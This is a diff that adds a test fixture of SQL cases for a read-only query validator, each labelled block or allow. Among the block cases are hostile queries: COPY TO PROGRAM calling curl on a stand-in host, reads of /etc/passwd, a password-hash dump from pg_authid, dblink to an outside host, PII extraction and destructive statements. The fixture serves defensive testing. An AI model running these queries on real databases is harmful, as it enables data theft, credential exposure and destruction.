@@ -1,0 +1,66 @@
+# Adversarial and benign SQL for the safety layer. Used by tests/test_validator.py and
+# scripts/safety_report.py (parser validator vs a naive keyword blocklist).
+# expect: block | allow
+
+- {id: drop_table, expect: block, sql: "DROP TABLE orders"}
+- {id: delete_all, expect: block, sql: "DELETE FROM orders"}
+- {id: update_prices, expect: block, sql: "UPDATE products SET list_price = 0"}
+- {id: insert_row, expect: block, sql: "INSERT INTO stores (store_id, store_name) VALUES (99, 'x')"}
+- {id: truncate, expect: block, sql: "TRUNCATE order_items"}
+- {id: alter_table, expect: block, sql: "ALTER TABLE orders ADD COLUMN x int"}
+- {id: create_temp, expect: block, sql: "CREATE TEMP TABLE t AS SELECT * FROM orders"}
+- {id: stacked, expect: block, sql: "SELECT 1; DROP TABLE orders"}
+- {id: stacked_comment, expect: block, sql: "SELECT 1 /* harmless */; DELETE FROM orders --"}
+- {id: mixed_case, expect: block, sql: "dRoP tAbLe orders"}
+- {id: cte_delete, expect: block, sql: "WITH d AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM d"}
+- {id: cte_update, expect: block, sql: "WITH u AS (UPDATE products SET list_price = 1 RETURNING product_id) SELECT * FROM u"}
+- {id: select_into, expect: block, sql: "SELECT * INTO stolen FROM orders"}
+- {id: for_update, expect: block, sql: "SELECT order_id FROM orders FOR UPDATE"}
+- {id: copy_out, expect: block, sql: "COPY orders TO '/tmp/orders.csv'"}
+- {id: copy_program, expect: block, sql: "COPY (SELECT 1) TO PROGRAM 'curl evil.example'"}
+- {id: do_block, expect: block, sql: "DO $$ BEGIN DELETE FROM orders; END $$"}
+- {id: set_role, expect: block, sql: "SET ROLE warehouse_admin"}
+- {id: reset_readonly, expect: block, sql: "SET transaction_read_only = off"}
+- {id: grant, expect: block, sql: "GRANT ALL ON orders TO PUBLIC"}
+- {id: vacuum, expect: block, sql: "VACUUM FULL orders"}
+- {id: lock_table, expect: block, sql: "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE"}
+- {id: call_proc, expect: block, sql: "CALL cleanup()"}
+- {id: explain_analyze_delete, expect: block, sql: "EXPLAIN ANALYZE DELETE FROM orders"}
+- {id: prepare, expect: block, sql: "PREPARE p AS DELETE FROM orders"}
+- {id: pg_sleep, expect: block, sql: "SELECT pg_sleep(60)"}
+- {id: pg_read_file, expect: block, sql: "SELECT pg_read_file('/etc/passwd')"}
+- {id: pg_ls_dir, expect: block, sql: "SELECT * FROM pg_ls_dir('.')"}
+- {id: set_config, expect: block, sql: "SELECT set_config('statement_timeout', '0', false)"}
+- {id: dblink, expect: block, sql: "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)"}
+- {id: lo_import, expect: block, sql: "SELECT lo_import('/etc/passwd')"}
+- {id: nextval, expect: block, sql: "SELECT nextval('some_seq')"}
+- {id: terminate, expect: block, sql: "SELECT pg_terminate_backend(pid) FROM pg_stat_activity"}
+- {id: hr_salary, expect: block, sql: "SELECT full_name, salary FROM hr.employees"}
+- {id: hr_join, expect: block, sql: "SELECT s.store_name, e.salary FROM stores s JOIN hr.employees e ON e.store_id = s.store_id"}
+- {id: pg_catalog, expect: block, sql: "SELECT rolname, rolpassword FROM pg_catalog.pg_authid"}
+- {id: info_schema, expect: block, sql: "SELECT table_name FROM information_schema.tables"}
+- {id: pii_email, expect: block, sql: "SELECT email FROM customers WHERE state = 'CA'"}
+- {id: pii_subquery, expect: block, sql: "SELECT order_id FROM orders WHERE customer_id IN (SELECT customer_id FROM customers WHERE email LIKE '%@example.com')"}
+- {id: pii_star, expect: block, sql: "SELECT * FROM customers"}
+- {id: pii_qualified_star, expect: block, sql: "SELECT c.* FROM orders o JOIN customers c USING (customer_id)"}
+- {id: unknown_table, expect: block, sql: "SELECT * FROM payroll"}
+- {id: cross_db, expect: block, sql: "SELECT * FROM otherdb.public.users"}
+- {id: union_pii, expect: block, sql: "SELECT store_name FROM stores UNION SELECT phone FROM customers"}
+- {id: empty, expect: block, sql: "   "}
+- {id: garbage, expect: block, sql: "please show me revenue"}
+
+# Benign queries: must pass. Several contain scary words inside literals or identifiers.
+- {id: ok_simple, expect: allow, sql: "SELECT count(*) FROM orders"}
+- {id: ok_literal_drop, expect: allow, sql: "SELECT 'DROP TABLE orders' AS note, count(*) FROM orders"}
+- {id: ok_reason_delete, expect: allow, sql: "SELECT reason, count(*) FROM returns WHERE reason <> 'deleted; update pending' GROUP BY reason"}
+- {id: ok_updated_alias, expect: allow, sql: "SELECT max(ordered_at) AS last_updated FROM orders"}
+- {id: ok_cte_window, expect: allow, sql: "WITH m AS (SELECT date_trunc('month', ordered_at) AS month, count(*) AS n FROM orders GROUP BY 1) SELECT month, n, n - lag(n) OVER (ORDER BY month) AS change FROM m ORDER BY month"}
+- {id: ok_join, expect: allow, sql: "SELECT p.category, sum(oi.quantity * oi.unit_price - oi.discount) AS revenue FROM order_items oi JOIN products p USING (product_id) GROUP BY 1 ORDER BY 2 DESC"}
+- {id: ok_customers_cols, expect: allow, sql: "SELECT segment, count(*) FROM customers GROUP BY segment"}
+- {id: ok_union, expect: allow, sql: "SELECT state FROM stores WHERE state IS NOT NULL UNION SELECT state FROM marketing_spend"}
+- {id: ok_generate_series, expect: allow, sql: "SELECT d::date AS day FROM generate_series('2026-09-01'::date, '2026-09-30'::date, interval '1 day') AS g(d)"}
+- {id: ok_schema_qualified, expect: allow, sql: "SELECT count(*) FROM retail.orders"}
+- {id: ok_percentile, expect: allow, sql: "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY unit_price) FROM order_items"}
+- {id: ok_trailing_semicolon, expect: allow, sql: "SELECT store_name FROM stores;"}
+- {id: ok_case_filter, expect: allow, sql: "SELECT ship_state, sum(CASE WHEN channel = 'online' THEN 1 ELSE 0 END) FROM orders GROUP BY 1"}
+- {id: ok_comment, expect: allow, sql: "-- revenue by state\nSELECT ship_state, count(*) FROM orders GROUP BY 1"}
